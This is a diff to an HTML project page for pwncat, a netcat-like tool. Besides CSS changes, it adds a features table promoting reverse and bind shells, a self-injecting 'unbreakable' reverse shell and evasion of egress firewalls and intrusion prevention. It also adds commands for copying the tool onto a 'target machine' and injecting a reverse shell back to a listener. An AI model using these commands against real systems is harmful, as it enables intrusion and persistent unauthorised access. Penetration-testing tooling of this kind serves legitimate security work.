@@ -10,14 +10,32 @@
 	<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/mini.css/3.0.1/mini-default.min.css">
 	<script async src="https://www.googletagmanager.com/gtag/js?id=UA-60914146-3"></script>
 	<style>
-		body, pre, code, header, div, blockquote {
-			background-color:#000 !important;
+		html, body {
+			font-size: 1.1rem;
+		}
+		body, header, div, blockquote, table th, table td, a, a:link, a:visited, a:active, [type="checkbox"].drawer+* {
+			background-color:#000;
 			color:#006400;
-			border:0px !important;
+			/*color:#74d274;*/
+			border:0px;
+		}
+		pre,  code {
+			color:#74d274;
+			background-color: #282a28;
+		}
+		pre {
+			border: 10px solid black;
+		}
+		.hover, h1:hover, h2:hover, a:hover, pre:hover, code:hover {
+			color: #00FF00 !important;
+			cursor: url("https://s3-us-west-2.amazonaws.com/s.cdpn.io/9632/happy.png"), auto;
 		}
 		h1 {
 			margin: 5px;
 			padding: 0;
+		}
+		li {
+			list-style-type: none;
 		}
 		marquee.headline {
 		}
@@ -28,9 +46,7 @@
 		marquee.headline.inner {
 			width: 260px;
 		}
-		html, body {
-			font-size: 1.1rem;
-		}
+
 		@media only screen and (max-width: 1200px) {
 			html, body {
 				font-size: 1.0rem;
@@ -60,15 +76,10 @@
 			html, body {
 				font-size: 0.5rem;
 			}
-		}
+		}/*
 		a:link, a:visited, a:active {
 			color: #006400;
-		}
-		.hover, h1:hover, a:hover, code:hover, pre:hover {
-			color: #00FF00 !important;
-			cursor: url("https://s3-us-west-2.amazonaws.com/s.cdpn.io/9632/happy.png"), auto;
-		}
-		li {list-style-type: none;}
+		}*/
 	</style>
 	<script>
 		window.dataLayer = window.dataLayer || [];
@@ -114,6 +125,115 @@
 				<blockquote cite="github.com/cytopia/pwncat">
 					Netcat on steroids with Firewall, IDS/IPS evasion, bind and reverse shell, self-injecting shell and port forwarding magic - and its fully scriptable with Python (<a href="https://github.com/cytopia/pwncat/tree/master/pse">PSE</a>).
 				</blockquote>
+				<h2>Features</h2>
+				<table>
+					<thead>
+						<tr>
+							<th>Feature</th>
+							<th>Description</th>
+						</tr>
+					</thead>
+					<tbody>
+						<tr>
+							<td data-label="Feature"><a href="https://github.com/cytopia/pwncat/tree/master/pse">PSE</a></td>
+							<td data-label="Description">Fully scriptable with Pwncat Scripting Engine to allow all kinds of fancy stuff on send and receive</td>
+						</tr>
+						<tr>
+							<td data-label="Feature">Self-injecting reverse shell</td>
+							<td data-label="Description">Self-injecting mode to deploy itself and start an unbreakable reverse shell back to you automatically</td>
+						</tr>
+						<tr>
+							<td data-label="Feature">Unbreakable reverse shell</td>
+							<td data-label="Description">Reverse shell can reconnect if you accidentally hit <kbd>Ctrl</kbd>+<kbd>c</kbd></td>
+						</tr>
+						<tr>
+							<td data-label="Feature">Bind shell</td>
+							<td data-label="Description">Create normal bind shells for any operating system</td>
+						</tr>
+						<tr>
+							<td data-label="Feature">Reverse shell</td>
+							<td data-label="Description">Create normal reverse shells for any operating system</td>
+						</tr>
+						<tr>
+							<td data-label="Feature">UDP Reverse shell</td>
+							<td data-label="Description">Try this with the traditional <code>netcat</code></td>
+						</tr>
+						<tr>
+							<td data-label="Feature">Port forwarding</td>
+							<td data-label="Description">Local and remote port forward (Proxy server/client)</td>
+						</tr>
+						<tr>
+							<td data-label="Feature">Detect EGRESS firewalls</td>
+							<td data-label="Description">Scan and report open egress ports on the target (port hopping)</td>
+						</tr>
+						<tr>
+							<td data-label="Feature">Evade EGRESS firewalls</td>
+							<td data-label="Description">Evade egress firewalls by round-robin outgoing ports (port hopping)</td>
+						</tr>
+						<tr>
+							<td data-label="Feature">Evade IPS</td>
+							<td data-label="Description">Evade Intrusion Prevention Systems by being able to round-robin outgoing ports on connection interrupts (port hopping)</td>
+						</tr>
+						<tr>
+							<td data-label="Feature">IPv4 / IPv6</td>
+							<td data-label="Description">Dual or single stack IPv4 and IPv6 support</td>
+						</tr>
+						<tr>
+							<td data-label="Feature">TCP / UDP</td>
+							<td data-label="Description">Full TCP and UDP support</td>
+						</tr>
+						<tr>
+							<td data-label="Feature">Stateful UDP</td>
+							<td data-label="Description">Stateful connect phase for UDP client mode - allows you to try IPv4 and IPv6 simultaneously and use the first available one on the server</td>
+						</tr>
+						<tr>
+							<td data-label="Feature">Compatibility</td>
+							<td data-label="Description">Use the traditional <code>netcat</code> as a client or server together with <code>pwncat</code></td>
+						</tr>
+						<tr>
+							<td data-label="Feature">Python 2 / Python 3</td>
+							<td data-label="Description">Works with Python 2, Python 3, pypy2 and pypy3</td>
+						</tr>
+						<tr>
+							<td data-label="Feature">Cross OS</td>
+							<td data-label="Description">Works on Linux, MacOS and Windows as long as Python is available</td>
+						</tr>
+						<tr>
+							<td data-label="Feature">Portable</td>
+							<td data-label="Description">Single file which only uses core packages - no external dependencies required</td>
+						</tr>
+					</tbody>
+				</table>
+				<br/>
+
+				<h2>TL;DR</h2>
+				<h3>Install</h3>
+				<p>Use <code>pip</code> to install locally</p>
+<pre class="hi">
+pip install pwncat
+</pre>
+				<h3>Deploy to target</h3>
+				<p>Copy base64 data to clipboard from where you have internet access</p>
+<pre class="hi">
+curl https://raw.githubusercontent.com/cytopia/pwncat/master/bin/pwncat | base64
+</pre>
+				<p>Paste it on the target machine</p>
+<pre class="hi">
+echo "&lt;BASE64 STRING&gt;" | base64 -d &gt; pwncat
+chmod +x pwncat
+</pre>
+				<h3>Inject to target</h3>
+				<p>If you found a vulnerability on the target to start a very simple reverse shell,
+				such as via bash, php, perl, python, nc or similar, you can instruct your local
+				pwncat listener to use this connection to deploy itself on the target automatically
+				and start an additional unbreakable reverse shell back to you.</p>
+<pre class="hi">
+pwncat -l 4444 --self-inject /bin/bash:10.0.0.1:4445
+</pre>
+
+				<br/>
+
+				<h2>Usage</h2>
 				<pre>
 usage: pwncat [-Cnuv] [-e cmd] hostname port
        pwncat [-Cnuv] [-e cmd] -l [hostname] port
